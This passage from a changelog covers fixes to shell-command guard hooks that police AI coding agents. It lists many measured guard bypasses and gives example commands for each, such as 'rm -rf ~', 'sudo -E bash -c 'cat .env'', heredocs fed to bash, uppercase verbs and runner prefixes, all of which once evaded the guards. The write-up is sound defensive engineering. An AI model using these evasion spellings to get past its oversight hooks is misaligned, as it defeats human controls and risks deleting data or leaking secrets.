  The sniff can only ADD strictness, checked in both directions rather than asserted. A false positive under Claude Code costs nothing reachable: `guard-rm` is the tree's only `Outcome::Ask` producer and both of its routes need an object `tool_input`, so a string-valued payload returns Allow and there is no Ask to convert; the fail-closed parse arm is unreachable too, since a payload that failed to parse was never sniffed. A false negative leaves exactly the previous behaviour. `spawn_agents_on_csv`/`multi_agents` are deliberately off the list — variant spellings this repo has not measured, and a sniff list is a place to be conservative.

- **A blank line inside an `apply_patch` update hunk hard-blocked every security-critical hook.** `patch.rs` matched the first byte of each hunk line, and an empty line's `first()` is `None`, which fell to the reject arm as `invalid update line prefix`; `normalized_inputs` propagated it and dispatch turned it into `exit 2` on all 13 security-critical hooks under Codex. A blank context line is legal in a unified diff — spelled `" "` canonically, but any producer that trims trailing whitespace emits `""` — so ordinary edits were blocked with a message claiming the patch was malformed. Fail-closed, so not a hole; but the likely operator response is to unset `CADENCE_HARNESS`, which is precisely the previous entry. Empty now parses as a blank context line, landing on both sides exactly as a spaced one does; the widening is scoped to empty, and a non-empty unprefixed line is still a schema error.

- **Denial-ledger volume was proportional to the patch body.** `log_denial`/`log_bypass` had moved inside dispatch's per-target loop, so one `apply_patch` with N file operations wrote up to N rows per security-critical hook into an uncapped `denials.jsonl` — bounded only by what the model produced, and skewing every rate computed off denial counts (nudge-fire rates are the denominator for every adherence measurement). Both now run once per hook invocation, against the payload the harness sent, carrying the aggregated outcome and a `targets: N` count. Measured: a 12-operation patch of secret-bearing files wrote 12 rows, now writes 1. `targets` is a count, never a path, so the privacy contract is unchanged.

- **The compatibility test that should have caught the `guard-rm` gap was tautological.** It read a report generated from a hand-authored config and asserted each security-critical capability's status was `native`/`adapted` with a non-empty `evidence` *string* — a checked-in JSON agreeing with itself, and `evidence` was free text with no referential integrity. `security_critical_adapted_rows_name_a_test_that_exists` now requires evidence on a security-critical `adapted` row to be a `path::test_name` reference and resolves it: the file must exist and the name must be a real `#[test]` in it. Six rows had to earn their claim — four now name tests written for them (`prevent-secret-writes`, `guard-dotfiles`, `nested-function-calls`, `ask-outcomes`), two point at existing ones. The checker is itself tested in both directions, since a bug making it always pass would disarm the gate silently.

  Related coverage the same review found missing: the `Ask` → `Block` conversion — one of the two behaviours that exist to stop Codex failing open — had **no test at all**, and neither did dispatch's stdin-parse fail-closed arm, half the `mcp__` classifier (the `grep`/`search`/`find_file` and `get_file`/`fetch_file`/`load_file` branches), or `ObsidianTrashGuard`'s new delete-detection branch below the helper level. All four now have one, each with a control so a passing assertion means the Codex route did the work.

- **`run_check_from_stdin` was a second, weaker entry point.** Public API, and it skipped `normalized_inputs()`, so an `apply_patch` payload reached the check as one opaque input with no `file_path` and every path- and content-scanning guard saw nothing to judge. Nothing shipped was exposed — every `src/main.rs` hook arm calls the dispatch wrapper — but the next caller reaching for the convenient one would silently have got less enforcement. Routed through normalization with strictest-wins, rather than deprecated, since "Claude-only" is not a property this function can enforce. It deliberately does not gain the dispatch wrapper's telemetry tail or Codex fail-closed parse arm, which need the canonical registry hook name only the binary has; it stays the *unlogged* path, not a weaker one.

- **`prevent-secret-leaks` lowercased the whole command before segmenting it, hiding `sudo -A`/`-E`/`-H`/`-P` from the guard alone (cameronsjo/cadence-hooks#508).** `command_segments`'s sudo-flag peel matches `SUDO_NO_ARGUMENT_SHORT_FLAGS` case-sensitively, on purpose — sudo's own grammar is case-load-bearing (`-P` takes no argument, `-p` takes a prompt string), so folding past the verb cannot represent that distinction (#503 already forbids widening that constant into a case-fold). Segmenting a pre-lowered command therefore folded `-A`/`-E`/`-H`/`-P` to `-a`/`-e`/`-h`/`-p`, none of which are in that allowlist, so the peel refused and `sudo -E bash -c 'cat .env'` never got its `bash -c` wrapper expanded into a segment this guard could see — the exact residual miss #497's changelog entry named as pre-existing and outside that fix's parser. Five other guards already caught this shape through `core::shell`'s shared segmenter; this guard alone read only the unexpanded outer line. `-S` survived by coincidence (it folds to `-s`, a distinct, also-argument-free allowlist member).

  **Fixed by segmenting the ORIGINAL command, matching what the sibling `prevent_secret_writes::bash_targets_env_file` already does** — `lower` now backs only the cheap pre-filter. Directory-change invalidation expands the original command and folds each resulting segment's command word, while every other comparison that needs case-insensitivity (the dangerous-token classifier and the metadata-safe exemption) folds at its own comparison site rather than depending on pre-lowered input. This also let a since-removed recovery function (`original_case_token_at`, which reconstructed a `.envrc` operand's real case from a lowercased match) be deleted outright: once segments come from the un-lowered command, `segment_env_reads` already hands back each operand in its real case, so the two-file case-sensitive-filesystem carve-out (`.envrc` vs `.ENVRC`) resolves directly with no recovery step. Four positive-control tests (`sudo -A/-E/-H/-P bash -c 'cat .env'`) each measured Allow before this fix and Block after; a fifth (`-S`) and an exemption-narrowing control (an `env`-chdir-wrapped metadata-safe command) pin the two failure directions this change must not introduce.

- **Four shell-parser segmentation misses that hid a command from every block-capable guard (cameronsjo/cadence-hooks#490, #491, #496, #497).** All four are the same class — the dangerous command escapes inspection entirely rather than being wrongly blocked — and all four were measured against a built binary, each payload paired with a known-bad twin returning **Block** in the same run. Across the two probe scripts, 17 verdicts flipped Allow → Block and none flipped the other way.

  **`#` now starts a comment at a word boundary (#490), the headline of the four.** It defeated all six guards probed: `guard-rm`, `prevent-secret-leaks`, `guard-gh-write`, `git-safety`, `guard-op-vault-scan`, `guard-gh-dangerous`. An apostrophe inside a trailing comment — `echo hi # it's fine` — opened a single-quote state that never closed, so the newline stopped being a segment boundary, the whole command collapsed into one segment, and the verb resolved to `echo`. bash discards the comment, so the command on the next line is a command in its own right.

  **Recognizing a comment takes more state than "the previous character was a space", and the first cut of this fix got that wrong badly enough to be net negative.** A `#` opens a comment only outside quotes, outside `${…}` / `$(…)` / `$((…))` / `` `…` ``, and after *unescaped* whitespace. Testing only the preceding character — while the splitter tracked quote state and nothing else — meant a `#` inside an expansion discarded the rest of the line, taking every command on it out of reach of every guard: `echo ${x:- # } ; rm -rf ~` segmented to `["echo ${x:-"]` while bash ran the deletion, and `echo a\ #x && rm -rf ~` did the same because `\ ` is an escaped space joining one word, not a boundary. Those inputs are ordinary — anyone writing `${VAR:-default}` with a `#` in it reaches them — and they blocked correctly *before* the comment rule existed, so the first cut closed one miss and opened a wider one. The scan now tracks quotes, open expansions, backticks and escapes, and lives in a single function ([`comment_spans`]) that both the heredoc pass and the segmenter call, because two hand-rolled copies of this condition are exactly how the permissive one ships. Where it stays narrower than bash — no comment opens after `(` or `)` — the effect is that more text stays under inspection, which is the safe direction.

  **Open expansions are a stack of opener kinds, not a counter, and the difference is a whole bypass.** A single counter incremented by both `${` and `$(` and decremented by both `)` and `}` reaches zero on a `)` that is merely *data* inside a parameter expansion — bash never ends `${…}` on one. So `echo ${x:-a)b # c} ; rm -rf ~` segmented to `["echo ${x:-a)b"]` while bash printed `a)b # c` and ran the deletion, reopening the very bypass the comment rule closed, one character over. It was reachable through `:-` `:=` `:+` `%` `/` `//` and through `$()` nested inside `${}`. A closer now pops only its own kind, and a **mismatched closer is ignored rather than treated as an error** — the direction is what makes that safe: an opener left on the stack keeps the scan inside an expansion, which *disables* stripping and over-inspects. Every unbalanced shape measured fails exactly that way.

  **A backslash-newline inside a comment is not a continuation.** bash ends a comment at the newline, so the trailing backslash is comment text and the next line begins a new command; joining it pulled that command into the comment, where the strip pass deleted it. The spellings that carry a separator in the comment body (`#;\`, `#|\`) are the sharp ones, because those are precisely what a comment-blind splitter used to survive by splitting on the separator.

  **Two further misses fell out of the same review, both fixed here.** The heredoc terminator-never-matched fallback keeps body lines verbatim so nothing bash runs is dropped, but those lines are *data* handed on as shell syntax, so the comment pass ate a `$(…)` sitting behind a `#` in the prose — expansion depth cannot catch that one, since the `#` precedes the `$(`, so the substitution spans are now carried separately. And a commented-out introducer (`echo hi # cat <<EOF`) was still detected as a heredoc, consuming the following lines as a body when bash treats them as commands; the delimiter scan now runs on the pre-comment part of the line. Every row above is asserted against a real-bash canary rather than against a model of bash — the whole failure mode here was a parser that disagreed with the shell while its unit tests agreed with the parser.

  **The heredoc carry site joins spans with a newline rather than a space, and that is a prerequisite for the comment rule, not a tidy-up.** Landing the comment arm alone was measured to collapse `cat <<EOF # note` plus a body span into `cat <<EOF # note $(rm -rf ~)`, which the new rule then discarded whole — `command_segments` returned `["cat <<EOF"]` and the deletion vanished, a fresh miss manufactured out of a fix. bash runs that deletion. A newline keeps each span its own segment, out of the comment's reach, and `strip_heredoc_bodies` already joins its output on `\n`, so the span still reaches `substitution_bodies` and `child_scripts` unchanged. The `$(`…`)` delimiters are deliberately **not** stripped: `enforce_worktree` relies on the substitution-ness of `$(cd /x)` to treat it as a child scope, and stripping them would reintroduce the #228 bypass.

  **The clobber-redirect check tests backslash parity (#491).** `>|` was detected by looking at the raw last character, so `echo hi \>| rm -rf ~` glued the pipe onto its segment and hid the deletion behind it — `\>` is an escaped `>`, a literal argument, and the `|` after it is a real pipe (bash prints `hi >` through it). Parity is required rather than a blanket "a backslash before `>` means split", because the two cases sit one character apart: `echo hi \\>| /tmp/f` is a literal backslash followed by a genuine clobber redirect, and bash creates the file. Both directions are carried as tests, the same odd/even rule `take_logical_line` already applies to a trailing backslash.

  **`--` is skipped after `-c` (#496), and `sudo`'s argument-free options are walked rather than refused outright (#497).** `--` ends the shell's own option parsing, so the script is the token after it; returning the `--` handed guards a segment of two dashes and left the real script inside one whitespace-bearing token — the shape `prevent-secret-leaks`' false-positive firewall skips by design — so `bash -c -- 'cat .env'` reached no guard while the plain spelling blocked. For `sudo`, any flag previously stopped the prefix peel, hiding every flagged spelling of a wrapper. The never-guess property is kept: an option that *takes* an argument makes the next word a value, not a command, so `sudo -u root bash -c '…'` stays unexpanded and `-u/bin/bash` — which `command_word` would basename straight to `bash` — stays out of reach of a false block (#493); unknown flags are refused for the same reason. The allowlist is **case-sensitive on purpose** — folding case past the verb onto flags is what regressed `-C`/`-P`/`-S` in #489, and sudo's own grammar is case-load-bearing (`-P` takes no argument, `-p` takes a prompt). The two fixes live in different functions and neither subsumes the other, so `sudo -E bash -c -- '<script>'` is pinned by its own test.

  **The two guard gaps found beside that parser are now dispositioned (#509), and `guard-gh-dangerous` keeps all three of its matching passes while gaining two.** The reported gap was pass 1 matching `strip_quotes(command)` over the whole command, which let one unmatched apostrophe anywhere consume every later segment and erase `gh repo delete` from the match — `echo it's && gh repo delete o/r --yes` allowed. Pass 1 now judges each executable segment independently, so the prose exemption survives without one well-formed quoted argument holding authority over a different segment.

  **Routing pass 1 through the segmenter narrows what it sees, so two conservative arms cover what the segmenter deliberately drops.** This is the part worth reading, because the first draft of this fix replaced the coarse `bash -c` pass with the per-segment loop on the premise that the segmenter subsumed it, and a differential against a built binary measured twenty `Block` → `Allow` flips that real bash executes — eleven behind an unpeelable wrapper prefix, nine inside a heredoc. **The `bash -c` pass stays, as an additional arm.** `skip_expansion_prefixes` refuses to peel past a prefix flag it cannot classify — the never-guess property the paragraph above keeps on purpose, which is exactly why `sudo -u root bash -c '<delete>'` reaches no segment — and the whole reason that refusal was safe is that a coarser pass caught it anyway: a literal `bash -c` in the quote-stripped text plus `gh repo delete` in the raw text, no peeling required. Ten spellings are pinned by test (`sudo -u/--user=/-H -u`, `stdbuf`, `nice`, `xargs -I{}`, `find -exec`, `timeout`, `env -i`). It costs one known false block — `bash -c 'echo hi' '<delete>'`, where the extra argument becomes `$1` and never runs — kept deliberately, and recorded as a test rather than left implied. **And the unmatched-quote fallback now also fires on a heredoc whose consumer is a shell.** The segmenter strips heredoc bodies because a body is normally DATA (`cat <<EOF` … `EOF` writes prose out; that stripping is what keeps a body line from becoming a bogus segment). The premise inverts when a shell reads the body: `bash <<EOF` … `EOF` executes every line, and the delete was in the text that got dropped. Both arms still require the raw text to name the exact irreversible operation, so `cat <<EOF` bodies and balanced quoted prose stay out — pinned in both directions.

  **That heredoc predicate was first written as a hand-rolled whitespace scan, and a second differential measured sixteen more `Block` → `Allow` flips against it, each confirmed to delete under real bash (#543).** Three independent soft edges, one per hand-rolled part. Splitting the line on whitespace alone meant a shell name touching the operator was not a word, so `bash<<EOF`, `/bin/bash<<EOF` and `{ bash; } <<EOF` named no consumer — and `cat<<EOF` is ordinary shell, not obfuscation. Joining continuations with a SPACE where the shell removes **both** characters of the backslash-newline pair turned `bash <\` ⏎ `<EOF` into `< <EOF` (not an introducer) and `bas\` ⏎ `h` into two half-words that never reassembled. And the consumer inventory omitted the csh family, `ash` and `fish`, and could not see a shell named by a variable at all, so `$SHELL <<EOF` — a portable idiom — passed.

  **Fixed by deleting the parallel scanners rather than patching them, which is what the repo's own doc comments have been arguing for since #475.** `core::shell` already had a correct implementation of all three jobs; they were private. `logical_lines`, `heredoc_introducers` and `strip_comments` are now public, and the predicate composes them: the shell's own line joining, the segmenter's own quote-aware introducer scan, and the same `strip_quotes` masking passes 1 and 2 already use. `heredoc_delimiters` became `heredoc_introducers` and now returns the byte range of the whole construct, not just the delimiter word — a caller must blank that range before reading command words, or the terminator reads as a command (`cat <<bash` looks like it names a shell) and a glued command word does not read as one at all. An unresolvable command word (`$SHELL`, `${SHELL}`) counts as a shell, fail-closed; a word that merely *contains* an expansion (`$HOME/notes.md`) does not, so ordinary `cat <<EOF > $HOME/notes.md` writes are untouched. `SHELLS` is now the single inventory behind both the consumer test and the `bash -c` wrapper regex, which had silently disagreed (`bash|sh|zsh` beside a seven-name array) with nothing explaining why; the one real asymmetry — `source` and `.` are consumers but never take `-c` — is stated in the code. A fresh 1605-probe differential against binaries from both trees, each probe also run under real bash with a logging `gh` stub, finds **no** remaining `Block` → `Allow` row that deletes; the ones that remain are data heredocs fed to `cat`/`tee`/`grep`/`sed`/`wc`, which is the improvement.

  **The unmatched-quote arm's stated justification was measured false, and the arm is narrowed to match (#543).** The comment claimed an unmatched quote means the command "is not executable as written, so failing closed costs nothing". An apostrophe inside a heredoc body or a comment is literal text: bash runs `cat > README.md <<'EOF'` / `Don't run <delete>` / `EOF`, `cat <<EOF` / `it's risky: <delete>` / `EOF`, and `echo ok # don't <delete>` cleanly and deletes nothing, and all three blocked where main allowed. Documenting a `gh repo delete` procedure via a heredoc is plausible work in this repository. The scan now runs over a view with heredoc bodies and comments removed, so what it fires on is genuinely unbalanced shell syntax and the justification is true as written. The arm's actual target (`echo it's && <delete>`) and the heredoc arm beside it (`bash <<EOF` / `echo "<delete> is dangerous"` / `EOF`, where a shell really is reading the body) are pinned as controls so the narrowing cannot drift into the class it was meant to keep.

  **The same arm folded bash's third quoting kind into its first, and that too was measured rather than reasoned.** `$'…'` is ANSI-C quoting, where a backslash escapes whatever follows **including the closing quote**; `'…'` is POSIX, where nothing escapes and the first `'` closes. Scanning both under the POSIX rule closed an ANSI-C run at its escaped apostrophe, left the run's real closing quote opening a second unterminated one, and reported a balanced command as unbalanced — so `echo $'gh repo delete: it\'s dangerous, don\'t'` blocked where main allowed, on prose bash runs cleanly. `core::shell` had already named all three kinds for exactly this reason, and its own module doc calls a divergence between two scanners "a boundary the shell does not have"; this was that divergence, in a fourth copy. The scan now distinguishes the three, and the two-state version's catch-all arm goes with it — not because it was a hazard, but because the closed enum makes it dead code the compiler now enforces the absence of. (An earlier draft of this entry credited this change with removing a panicking `unreachable!`. There was never one: the arm it replaced was a non-panicking `Some(_) => {}` whose own comment said it had been written that way deliberately, because a guard that panics is a fail-OPEN under a runner reading exit codes. That hazard was closed a commit earlier, and the claim is corrected here rather than left to mislead the next reader about which change did what.)

  **The same scan then got bash's ANSI-C *opening* condition wrong in the other direction, and the fix is one character.** Bash opens ANSI-C only when the run of `$` immediately before the quote is of **odd** length: `$'` and `$$$'` are ANSI-C, while `$$'` is the `$$` PID expansion followed by an ordinary POSIX run. Setting a pending flag on every `$` read every run length as ANSI-C, so a balanced `echo $$'gh repo delete it\'` scanned as unbalanced and the fallback blocked it. Toggling rather than setting encodes the parity. Verified against `bash -n` as an oracle over every string of length ≤ 5 in the quote alphabet: the setting form diverges on 1 of 3,905, the toggling form on **0**. `core::shell` carries the identical defect (`'$' if chars.peek() == Some(&'\'')`), so the consolidation filed alongside this should inherit the fix rather than re-derive it.

  One row from that differential reads like a regression and is not, so it is pinned as a test rather than left to be rediscovered: `echo $'it\'s fine' && echo gh repo delete discussion` is Allow on main and Block here. Main allowed it only because its whole-command quote collapse erased the second segment outright — the #509 defect itself. The later segment names the operation in bare, unquoted words, so the per-segment pass matches it with no quoting involved at all. A `main` Allow is evidence of a regression only when that Allow was correct.

  Three residuals, Allow on both trees and so not regressions: an interpreter that executes stdin but is not a shell (`python3 <<EOF` / `os.system("<delete>")`) escapes the consumer inventory, `eval "$(cat <<EOF … EOF)"` hides a heredoc from every pass, and the three quote-tracking implementations in this repo remain unconsolidated — this one is now correct but is still a copy. All are filed rather than fixed here.

  The `guard-rm` half needed no code change: the trailing-backtick shape reaches `Ask`, not a silent Allow, because `resolve_target` treats a backtick-bearing operand as an unresolvable command substitution, and a control now pins that. **The claim is scoped to that spelling only.** `rm -rf ~/Documents\`` is a bash syntax error, so `Ask` costs nothing there; its executable siblings (`~/Documents\`\``, `~/Documents$()`, `~/Documents${EMPTY}`) also land on `Ask` while bash runs them identically to the bare `rm -rf ~/Documents` this guard **Blocks**. That `Block` → `Ask` downgrade is pre-existing, untouched here, and filed on its own. The separate `prevent-secret-leaks` lowercasing defect remains scoped to #508.

- **Verb gates fold ASCII case, so a capitalized spelling of a gated verb no longer bypasses them (cameronsjo/cadence-hooks#488).** On a case-insensitive filesystem — APFS, the macOS default — the shell resolves `GIT` to the `git` binary and `RM` to `rm`, and runs them. Every verb gate compared against a lowercase literal, so against a built binary in a primary checkout `GIT commit -m x` measured **Allow** and `RM -rf <path>` measured a **silent Allow**, while their lowercase twins blocked and asked respectively. The `enforce_worktree` commit gate is the sharper of the two: `guard_rm` has a stated mitigation (a settings `allow Bash(rm:*)` rule keys on the leading word, so the guard defers rather than auto-approving), and the commit gate has none.

  **The fold lives in `core::shell::command_word`, the one "which verb is this?" normalization**, as a fourth step after the path split, the single backslash strip, and the `.exe` drop — so it composes with all three (`/usr/bin/GIT`, `\GIT`, `C:\…\GIT.exe` all resolve). Putting it there rather than at each gate is the same reasoning that consolidated four divergent copies in #450: a per-guard fold is a second normalization site, and a new gate that forgot it would silently reopen the bypass. `guard_rm`'s deliberately-separate local copy — which differs from the shared one only on repeating the backslash strip — folds in place, keeping that divergence intact.

  **Unconditional, not filesystem-aware.** Answering "will the shell find `GIT`?" honestly means probing the case-sensitivity of whichever `$PATH` volume holds the binary, not the cwd, for every verb, in hooks that run on every Bash call. A `cfg!(target_os)` shortcut is wrong in both directions — macOS supports case-sensitive APFS volumes and Linux supports case-insensitive mounts (ext4 casefold, ciopfs, NTFS/exFAT) — and a probe that fails needs a default anyway. On a case-sensitive host the cost is one spurious block on a command that would have failed as `command not found`.

  **That trade only holds because of direction, so every consumer was enumerated.** A normalization copied into a *detector* may be over-eager safely — it can only add blocks; copied into an *exemption* it can only subtract them, and over-eagerness is a vulnerability (the `xargs` bypass recorded on `prevent_secret_leaks::COMMAND_WRAPPERS`). `command_word` feeds both kinds. All but one consumer is a detector. The one exemption — `prevent_secret_leaks`' `METADATA_SAFE_COMMANDS` lookup — is a **provable no-op**, because `bash_leaks_secrets` lowercases the entire command before any of it runs, so no uppercase byte ever reaches the fold there. Its verdicts are byte-identical before and after, asserted directly rather than argued.

  **Only the verb folds.** Nouns, subcommand verbs, flags, and path operands stay case-sensitive: `gh` rejects `gh PR CREATE`, and folding past the verb is what regressed `-C`/`-P`/`-S` matching in #489 and silenced `env -C /tmp printenv` — a hardening change that net-weakened a guard. That case is carried as a standing regression test. A security review caught one guard breaking this invariant: `warn_issue_tracker`'s issue-create *decision* folded the whole phrase, so `gh ISSUE CREATE` nudged on text gh cannot run, and it disagreed with `guard_gh_write` about that same input. Fixed as `(?i:gh)\s+issue\s+create`, matching how the other guards spell it — the invariant was right, the guard was wrong.

  **`skip_transparent_prefixes` folds too, which is where the fold was one step short.** It tested `TRANSPARENT` membership against the raw token while `guard_rm` folded before its own `TRANSPARENT` test, so the two disagreed: `COMMAND`/`NICE`/`ENV`/`EXEC rm -rf <path>` resolved their leading word to the prefix, never reached the delete verb behind it, and degraded to an ask where the lowercase spellings blocked — and `NICE git commit` stayed a full Allow in `enforce_worktree`. All now block. Detector direction, so skipping more prefixes only exposes more verbs to the gates downstream. The flag refusal is untouched: `NICE -n 10 git commit` still declines to parse a prefix's own options, and `SUDO` still resolves to nothing because `sudo` is deliberately outside `TRANSPARENT`.

  **Four more gates in the same family were folded, each measured first.** `guard_gh_write`'s raw-text `WRITE_ACTIONS` patterns and `token_is_gh`; `guard_gh_dangerous`' `gh repo delete` and shell-wrapper patterns; `warn_going_public`'s local command word; `warn_issue_tracker`'s four `gh api` patterns (deliberate local copies of `guard_gh_write`'s same-named ones, so folding that file's set does not reach this one — each had to be done on its own). Only the leading `gh` folds in each; nouns, subcommand verbs, and method values stay case-sensitive where gh itself is.

  **The pre-filters were the half of this that unit tests could not see.** Four of those guards open with a cheap lowercase-only `contains("gh")` fast path, which returned Allow *before* the folded patterns could run — so `GH pr create` still measured Allow against the built binary with `is_write_command` and `token_is_gh` both already green. A pre-filter stricter than the matcher behind it is a silent veto; they now share one allocation-free `contains_ignoring_ascii_case`, and the assertion goes through `Check::run` so the veto cannot hide behind a green unit test again. The verb fold itself is likewise spelled once (`core::shell::fold_verb`) rather than hand-rolled in each guard that keeps a divergent local command word.

  **The follow-up verb-gate sweep closes the remaining measured case gaps**
  (#502). Push, secret-write, vault-scan, PR-context, untracked-file, and
  Obsidian trash checks now fold only the executable word while leaving flags,
  subcommands, and operands byte-for-byte. End-to-end controls run through each
  guard's `Check::run` entry point so an earlier case-sensitive prefilter cannot
  veto the shared normalization.

  **Three of those guards were also NARROWED in the same commit, and the fold
  is not where that came from.** `obsidian-trash-guard`,
  `warn-gh-merge-preflight`, and `warn-pr-issue-link` each opened with a
  substring scan of the whole command (`command.contains("rm")`,
  `contains("gh pr merge")`) and were rewritten to test the *segment head*
  instead. That change is orthogonal to case and it only ever subtracts:
  anything not in command-head position became invisible. Recorded explicitly
  because the paragraph above, read alone, promises a monotone widening — a
  reader diffing behavior against it would be misled about where every measured
  regression in the #528 security review lives.

  For the trash guard the removed shapes were real vault deletions, each one
  confirmed deleting a file through `bash`: `git rm note.md`,
  `sudo -u me rm note.md`, `find … -print0 | xargs -0 rm` (the canonical
  safe-for-spaces delete idiom), `for f in *.md; do rm $f; done`,
  `if true; then rm note.md; fi`, `eval rm note.md`, and
  `find . -exec sh -c 'rm note.md' \;`. Nothing else caught them — `guard-rm`
  gates dangerous *targets*, not vault recoverability. Every one of those seven
  is blocked again: the head test now runs after
  `core::shell::strip_leading_keywords` (a reserved word occupying the head
  position), after a runner peel that walks the runner's OWN flags via
  `core::shell::skip_runner_flags` rather than bailing on the first `-`, with
  `git rm` aliased to `rm` exactly as `prevent_secret_writes` already spells it,
  and with `eval`'s operand and a nested `sh -c` under `find -exec` routed back
  through the same scan. Each row is pinned by a differential test driven
  through `Check::run`.

  **Two measured gaps in that first fix, both found by re-reviewing it.** The
  runner peel covered `sudo`/`xargs` while `TRANSPARENT` admits `nice` and `env`
  only until their own options appear and models `timeout`/`stdbuf` not at all,
  so `nice -n 10 rm x`, `stdbuf -o0 rm x`, `timeout 5 rm x`, and
  `env -i /bin/rm x` still reached no verb gate. And the `git rm` alias tested
  the word immediately after `git`, which is exactly where git's own global
  options sit — `git -C . rm note.md`, `git --no-pager rm note.md`,
  `git -c core.pager=cat rm note.md` and four more spellings deleted the file
  unjudged. `skip_runner_flags` now carries a grammar per runner (`nice`'s bare
  `-10` adjustment, `timeout`'s positional DURATION, `env`'s assignment words),
  and `core::shell::skip_git_global_options` skips git's globals before any
  subcommand test. `prevent_secret_writes::writer_targets` — the precedent the
  alias was copied from — had the identical `git` gap and calls the same helper,
  so the two cannot drift apart again.

  **A third re-review found the peel was installed at one executable position
  and not the other.** A `find` exec-family action names a command the same way
  a segment head does, but the window there read the literal next word — so
  `find … -exec git rm {} \;`, which is plain `git rm`, and the seven runner
  spellings beside it deleted the file unjudged while the head position blocked
  every one. The two positions now share a single peel rather than each carrying
  a model, which is the drift that opened the gap. Separately, two of the runner
  grammars were short a real spelling of their own tool on macOS: `env`'s
  `-P utilpath`, which is in `/usr/bin/env`'s own usage line, and BSD `nice`'s
  doubled-dash adjustment (`nice --10`), which execs the utility after warning
  about the priority. Both are now modelled and both were checked against the
  tools' own usage output rather than from memory.

  **A fourth re-review found the peel fed the verb test and nothing else, so a
  modelled runner CARRYING A FLAG hid a shell wrapper at both positions.** The
  wrapper hunt (`core::shell`'s `shell_c_argument_tokens`, reached from
  `command_segments` and `child_scripts`) ran its own weaker model that admitted
  `nice`/`env` only while the next token was not an option and refused every
  value-taking `sudo` flag. So the verdict turned on one token —
  `nice bash -c 'rm note.md'` blocked, `nice -n 10 bash -c 'rm note.md'` did
  not — with the same flag peeling correctly at the verb gate one position over.
  Twenty-four rows were `main` BLOCK → branch ALLOW; sixteen were measured
  deleting a real file under `bash`. **This was never trash-guard's alone:** the
  wrapper hunt is shared, so `sudo -u me bash -c 'cat .env'`,
  `env -i sh -c 'op item list'`, `stdbuf -o0 sh -c 'git checkout -- .'` and
  `xargs -I{} bash -c 'gh repo delete …'` were invisible to
  `prevent-secret-leaks`, `prevent-secret-writes`, `git-safety`, `guard-gh-write`
  and `guard-op-vault-scan` in the same way. All three executable positions now
  share ONE peel, `core::shell::peel_command_runners`; the sudo-only walk beside
  it is gone. Consuming a KNOWN value-taking flag with its value is knowledge in
  the expansion path exactly as it is at a verb gate — what protects expansion is
  the refusal on flags the grammar does NOT model, which is unchanged, so
  `sudo -Z bash -c '…'` and `nice ---10 sh -c '…'` still stop the walk.

  **And widening the hunt exposed a subtraction underneath it: a segment that is
  a wrapper was losing its command substitutions.** `expand_segments` treated
  "has a `-c` script" and "has a `$(…)` body" as alternatives, but a
  substitution runs in the PARENT before the wrapper is spawned, so both
  execute — `bash -c 'echo hi' "$(rm note.md)"` deletes the file and reached no
  guard, on `main` too. The two are unioned now, which is what `child_scripts`
  had already done for the same reason (#228). Without it, every runner spelling
  the widened peel newly recognizes would have inherited the hole, and the
  change would have shipped a guard more permissive than the one it replaced in
  exactly the shape it existed to fix.

  **Measured, not argued.** Every guard consuming the changed primitive was
  enumerated and driven differentially — three binaries (`origin/main`, the
  branch before this change, after) × 15 guards × 160 commands = 2,400 rows per
  tree. Result: 72 blocks added, **0 blocks removed**, 0 nudges removed, 0
  non-0/2 exits. The 15 rows still weaker than `main` are all present before this
  change and are the deliberate narrowing (`npm run format`, `terraform destroy`,
  `echo rm` no longer match a substring scan) or commands that do not execute at
  all (`sudo -l`, `nice -é`). Three `guard-rm` rows escalate `Ask` → `Block`,
  pinned as their own test so a regression to a waveable prompt is a failure.

  **What stays open, so this list is not read as more than it is.** The head
  model reaches a verb where the shell runs an executable; it does not reach a
  verb built by substitution (`` `echo rm` x ``, `$(echo rm) x`), one carried in
  a body the model does not treat as executed (a `trap` handler, a `coproc`), a
  deleting binary outside the gated verb set (`srm`, `perl -e 'unlink'`), or one
  behind a runner option spelling outside the modelled grammar — `env -S`, which
  re-splits its value into the command line, is the deliberate case, and any
  unlisted option of any modelled runner is the general one, since the walk
  refuses a token it cannot classify rather than guess past it. That refusal is
  why an incomplete grammar costs a block and never invents one, and it is why
  this boundary is a class rather than a list: a spelling found later belongs to
  it already. Those are tracked separately — each needs a decision about how far
  a head model should follow a shell, not another peel arm. `docs/hooks.md`
  names the same boundary for the operator. **That boundary describes the HEAD
  model only** — the wrapper hunt behind it ran a weaker model of the same
  grammars, so options well inside this list (`-n 10`, `-i`, `-u FOO`,
  `-P /bin`, `-o0`) still hid a `sh -c`, and compound bodies well inside it
  (`if`, `for`, `until`, `case`, `( )`, `{ }`, a function body) hid one too,
  until the two entries below unified the models. This paragraph named `case`
  and `function` as open while the verb gate already read `do`/`then`, which is
  the shape of the confusion: the boundary belongs to a pre-processing model,
  and there was more than one.

  **What stays removed is the false-positive class the narrowing was for.**
  `npm run format` and `terraform destroy` inside a vault blocked under the old
  substring scan and are measured Allow now; both are pinned as controls, so a
  future widening cannot quietly restore the substring detector with them.

  The two nudge-only guards keep the narrowing for now — `sudo gh pr merge`,
  `GH_TOKEN=x gh pr create`, and the keyword-wrapped spellings no longer nudge,
  which is a missed reminder rather than an unguarded write. That has its own
  tracking issue rather than being fixed here, so the block-capable regression
  above lands on its own. `guard_push_remote`'s hand-rolled `(?i:\bgit)` verb
  fold — a fourth normalization of "which verb is this?" beside `command_word`,
  which the same review flagged — is likewise left alone and tracked as
  cameronsjo/cadence-hooks#539.

- **A shell wrapper inside a compound statement or a group is expanded, so `if`, `for`, `until`, `while`, `case`, `( )`, `{ }` and a function body stop hiding one.** The verb gate stripped shell scaffolding before it read a command word — `strip_group_wrappers` for `(`/`{`, `strip_leading_keywords` for `do`/`then` — so `if true; then rm note.md; fi` and `(rm note.md)` were judged. The wrapper hunt one position over, `core::shell::expand_segments` → `shell_c_argument_tokens`, stripped neither. So the segment head stayed `then` / `do` / `(bash`, the hunt returned `None`, and the inner script was never surfaced to any guard: `(bash -c 'rm note.md')`, `{ bash -c 'rm note.md'; }`, `if true; then bash -c 'rm note.md'; fi`, `for f in a; do bash -c 'rm note.md'; done`, `until`, `case x in x) …;; esac` and `f() { … }` were all `main` BLOCK → branch ALLOW, and every one was measured deleting a real file under `bash`. Two positions running two pre-processing models, on the same grammar — the identical shape as the runner-flag entry above, one layer over, and the fourth time this branch has closed it.

